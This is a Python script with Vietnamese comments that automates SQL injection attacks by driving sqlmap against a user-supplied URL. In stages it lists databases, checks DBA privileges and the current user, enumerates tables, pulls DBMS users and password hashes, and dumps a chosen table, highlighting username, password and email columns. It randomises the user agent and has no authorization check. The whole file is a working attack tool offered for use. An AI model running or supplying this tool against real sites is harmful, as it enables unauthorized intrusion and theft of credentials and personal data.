import subprocess
import sys
import re
import os
import csv

# Thêm class màu sắc để output đẹp hơn
class Color:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    END = '\033[0m'

def run_sqlmap_command(url, extra_args=None):
    """
    Hàm chạy sqlmap với các tham số tùy chỉnh.
    Trả về (stdout, csv_path) để xử lý logic tiếp theo.
    """
    if extra_args is None:
        extra_args = []

    # Xây dựng câu lệnh
    # Lưu ý: Bạn cần cài đặt sqlmap và đảm bảo nó có trong biến môi trường (PATH)
    command = [
        "sqlmap", 
        "-u", url, 
        "--batch",  # Chạy chế độ không tương tác
        "--random-agent" # Sử dụng User-Agent ngẫu nhiên
    ]
    
    # Thêm các tham số bổ sung (ví dụ: --dbs, --tables)
    command.extend(extra_args)

    print(f"\n{Color.BLUE}[*] Đang thực thi lệnh...{Color.END}")

    try:
        # Thực thi lệnh và bắt kết quả đầu ra theo thời gian thực
        process = subprocess.Popen(
            command, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.STDOUT, # Gộp stderr vào stdout để in ra cùng lúc
            text=True,
            bufsize=1,
            encoding='utf-8',
            errors='replace'
        )
        
        full_output = []
        csv_path = None
        
        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break
            if line:
                print(line, end='') # In ngay lập tức
                full_output.append(line)
                # Tìm và trích xuất đường dẫn file CSV nếu có
                if "--dump" in command:
                    match = re.search(r"dumped to CSV file '(.*?)'", line)
                    if match:
                        csv_path = match.group(1)

        return "".join(full_output), csv_path

    except FileNotFoundError:
        print(f"{Color.RED}[-] Lỗi: Không tìm thấy lệnh 'sqlmap'. Vui lòng cài đặt sqlmap trước.{Color.END}")
        return None, None
    except Exception as e:
        print(f"[-] Đã xảy ra lỗi ngoại lệ: {e}")
        return None, None

def _print_dump_from_csv(csv_path):
    """
    Hàm nội bộ để đọc và in dữ liệu từ file CSV dưới dạng bảng (Table) đẹp mắt.
    """
    try:
        with open(csv_path, 'r', encoding='utf-8', errors='replace') as f:
            reader = csv.reader(f)
            headers = next(reader, None)
            if not headers:
                return
            rows = list(reader)

            if not rows:
                print(f"{Color.YELLOW}[-] Bảng được dump ra nhưng không có dữ liệu.{Color.END}")
                return

            print(f"\n{Color.GREEN}[+] Đã lấy được {Color.BOLD}{len(rows)}{Color.END}{Color.GREEN} dòng dữ liệu:{Color.END}")

            # Tính toán độ rộng cột
            col_widths = [len(h) for h in headers]
            clean_rows = []
            for row in rows:
                clean_row = []
                for i, val in enumerate(row):
                    # Làm sạch payload rác
                    if "subclasses" in val and "read()" in val: val = "[DATA_ERROR]"
                    clean_row.append(val)
                    # Cập nhật độ rộng (giới hạn max 40 ký tự để không vỡ khung)
                    if len(val) > col_widths[i]: col_widths[i] = min(len(val), 40)
                clean_rows.append(clean_row)

            # Hàm vẽ đường kẻ
            def print_sep(char='-'):
                line = "+" + "+".join([char * (w + 2) for w in col_widths]) + "+"
                print(f"{Color.BLUE}{line}{Color.END}")

            # In Header
            print_sep('=')
            header_line = "|" + "|".join([f" {Color.BOLD}{Color.CYAN}{h.center(w)}{Color.END} " for h, w in zip(headers, col_widths)]) + "|"
            print(f"{Color.BLUE}{header_line}{Color.END}")
            print_sep('=')

            # In Rows
            for row in clean_rows:
                row_line = "|"
                for i, val in enumerate(row):
                    display_val = val if len(val) <= 40 else val[:37] + "..."
                    if headers[i].lower() in ['user', 'uname', 'pass', 'password', 'email']:
                        row_line += f" {Color.YELLOW}{display_val.ljust(col_widths[i])}{Color.END} |"
                    else:
                        row_line += f" {display_val.ljust(col_widths[i])} |"
                print(f"{Color.BLUE}{row_line}{Color.END}")
            print_sep()

    except FileNotFoundError:
        print(f"{Color.RED}[-] Lỗi: Không tìm thấy file CSV tại: {csv_path}{Color.END}")
    except Exception as e:
        print(f"{Color.RED}[-] Lỗi khi đọc và phân tích file CSV: {e}{Color.END}")

def analyze_and_print(output, command_args, csv_path=None):
    """
    Phân tích output từ sqlmap và in ra một bản tóm tắt dễ đọc.
    """
    if not output:
        return

    print(f"\n{Color.BLUE}╔{'═'*20} {Color.MAGENTA}TỔNG HỢP KẾT QUẢ{Color.BLUE} {'═'*20}╗{Color.END}")
    
    found_summary = False

    # Kiểm tra quyền DBA
    if "--is-dba" in command_args and "current user is DBA: True" in output:
        print(f"{Color.GREEN}[+] Quyền DBA: CÓ! Người dùng hiện tại là quản trị viên.{Color.END}")
        found_summary = True

    # Lấy user hiện tại
    if "--current-user" in command_args:
        match = re.search(r"current user:\s*'(.*)'", output)
        if match:
            print(f"{Color.GREEN}[+] User hiện tại: {match.group(1)}{Color.END}")
            found_summary = True

    # Liệt kê users
    if "--users" in command_args and "database management system users" in output:
        users = re.findall(r"\[\*\] '(.*)'", output)
        if users:
            print(f"{Color.GREEN}[+] Tìm thấy các user của hệ quản trị CSDL:{Color.END}")
            for user in users:
                print(f"  - {user}")
            found_summary = True

    # Phân tích kết quả dump bảng để tìm thông tin nhạy cảm
    if "--dump" in command_args:
        if csv_path:
            _print_dump_from_csv(csv_path)
            found_summary = True
    elif "--passwords" in command_args and "unable to retrieve the password hashes" in output:
        print(f"{Color.YELLOW}[!] Không thể lấy password hashes từ bảng hệ thống (thường do quyền hạn thấp).{Color.END}")
        print(f"{Color.YELLOW}    Gợi ý: Hãy thử dump bảng 'users' (hoặc tương tự) để tìm mật khẩu.{Color.END}")
        found_summary = True

    if not found_summary and "available databases" not in output:
        print(f"{Color.YELLOW}[-] Không có kết quả nổi bật để tóm tắt từ lệnh vừa chạy.{Color.END}")
    
    print(f"{Color.BLUE}╚{'═'*58}╝{Color.END}\n")

if __name__ == "__main__":
    os.system('') # Kích hoạt màu trên terminal Windows
    print("--- TOOL CHECK SQL INJECTION TỰ ĐỘNG ---")
    # 1. Nhập URL từ người dùng
    target_url = input("Nhập URL mục tiêu (VD: http://testphp.vulnweb.com/artists.php?artist=1): ").strip()
    
    if not target_url:
        print(f"{Color.RED}[-] URL không được để trống.{Color.END}")
        sys.exit(1)

    # 2. Bước 1: Kiểm tra kết nối và liệt kê Databases (--dbs)
    print("\n[+] BƯỚC 1: Kiểm tra lỗ hổng và lấy danh sách Database...")
    dbs_output, _ = run_sqlmap_command(target_url, extra_args=["--dbs"])

    # 3. Logic kiểm tra kết quả để quyết định đi tiếp
    # Nếu output chứa "available databases" nghĩa là đã khai thác thành công
    if dbs_output and "available databases" in dbs_output:
        print(f"\n{Color.GREEN}{Color.BOLD}[+] PHÁT HIỆN LỖ HỔNG THÀNH CÔNG!{Color.END}")
        
        # Tự động kiểm tra quyền Admin (DBA) và User hiện tại
        print("\n[+] Đang kiểm tra quyền quản trị (DBA) và User hiện tại...")
        priv_output, _ = run_sqlmap_command(target_url, extra_args=["--is-dba", "--current-user"])
        analyze_and_print(priv_output, ["--is-dba", "--current-user"], None)

        # Hỏi người dùng có muốn lấy danh sách bảng (Tables) không
        check_tables = input("\n[?] Bạn có muốn tiếp tục lấy danh sách BẢNG (Tables) không? (y/n): ").lower()
        if check_tables == 'y':
            print("\n[+] BƯỚC 2: Đang lấy danh sách Tables...")
            tables_output, _ = run_sqlmap_command(target_url, extra_args=["--tables"])

            # Hỏi tiếp về Users và Passwords
            check_users = input("\n[?] Bạn có muốn tiếp tục lấy danh sách USERS và PASSWORDS không? (y/n): ").lower()
            if check_users == 'y':
                print("\n[+] BƯỚC 3: Đang lấy Users và Passwords...")
                creds_output, _ = run_sqlmap_command(target_url, extra_args=["--users", "--passwords"])
                analyze_and_print(creds_output, ["--users", "--passwords"], None)

            # Hỏi tiếp về việc Dump dữ liệu từ bảng
            check_dump = input("\n[?] Bạn có muốn DUMP (xem dữ liệu) từ một bảng cụ thể không? (y/n): ").lower()
            if check_dump == 'y':
                table_to_dump = input("Nhập tên Bảng (Table) bạn muốn xem dữ liệu (nhập chính xác tên đã thấy ở Bước 2): ").strip()
                if table_to_dump:
                    print(f"\n[+] BƯỚC 4: Đang dump dữ liệu từ bảng '{table_to_dump}'...")
                    dump_output, csv_path = run_sqlmap_command(target_url, extra_args=["--dump", "-T", table_to_dump])
                    analyze_and_print(dump_output, ["--dump", "-T", table_to_dump], csv_path)
                else:
                    print(f"{Color.RED}[-] Tên bảng không được để trống.{Color.END}")
    else:
        print(f"\n{Color.RED}[-] Không tìm thấy lỗ hổng hoặc không thể liệt kê database.{Color.END}")
